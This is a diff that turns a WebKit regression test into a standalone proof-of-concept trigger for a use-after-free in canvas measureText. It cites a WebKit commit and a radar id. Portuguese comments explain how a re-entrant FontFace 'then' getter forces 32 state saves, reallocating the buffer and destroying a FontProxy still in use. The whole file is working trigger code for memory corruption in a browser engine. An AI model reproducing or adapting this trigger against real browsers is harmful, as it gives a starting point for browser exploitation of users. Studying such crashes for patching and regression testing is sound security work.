@@ -1,36 +1,54 @@
-
-<!-- Identical to offscreen-canvas2d-measuretext-uaf.html, but exercising CanvasRenderingContext2D path -->
+<!-- canvas2d-measuretext-uaf — FontProxy UAF via Vector reallocation -->
+<!-- Commit WebKit fe938b0a2301d3d3938b2f9f3c8cad60c7c2e1a6 -->
+<!-- rdar://185865732 -->
 <!DOCTYPE html>
-<p>This test passes if it does not crash Arial.</p>
 <script>
+fetch('Ahem.woff')
+    .then(function(r) { return r.arrayBuffer(); })
+    .then(function(b) {
+        return new Promise(function(res, rej) {
+            var fr = new FileReader();
+            fr.onload  = function(e) { res(e.target.result); };
+            fr.onerror = rej;
+            fr.readAsDataURL(new Blob([b], { type: 'font/woff' }));
+        });
+    })
+    .then(function(dataUrl) {
 
+        var face = new FontFace('MyTestFam', 'url("' + dataUrl + '")');
+        face.loaded;
+        document.fonts.add(face);
 
-  let face = new FontFace('MyTestFam', 'local(Arial)');
-  face.loaded;
-  document.fonts.add(face);
+        var context = document.createElement('canvas').getContext('2d');
 
-  let context = document.createElement('canvas').getContext('2d');
-
-  context.save();
-  context.lineWidth = 0.5;
-
-  context.font = '10px MyTestFam';
-
-  let reentered = false;
-  Object.defineProperty(FontFace.prototype, 'then', {
-    configurable: true,
-    get() {
-      if (reentered)
-        return undefined;
-      reentered = true;
-      for (let i = 0; i < 32; i++) {
+        // 1 save previo: forca state stack do inline storage para o heap
         context.save();
-        context.lineWidth = 1 + i;
-      }
-      reentered = false;
-      return undefined;
-    }
-  });
+        context.lineWidth = 0.5;
 
-  context.measureText('a');
+        context.font = '10px MyTestFam';
+
+        var reentered = false;
+        Object.defineProperty(FontFace.prototype, 'then', {
+            configurable: true,
+            get() {
+                if (reentered)
+                    return undefined;
+                reentered = true;
+                // 32 saves: forca REALLOCATION do buffer de heap
+                // O State que contem o FontProxy sendo usado por
+                // metricsOfPrimaryFont() estava no buffer antigo →
+                // buffer antigo liberado → FontProxy DESTRUIDO → UAF
+                for (var i = 0; i < 32; i++) {
+                    context.save();
+                    context.lineWidth = 1 + i;
+                }
+                reentered = false;
+                return undefined;
+            }
+        });
+
+        context.measureText('a');
+
+    });
 </script>
+
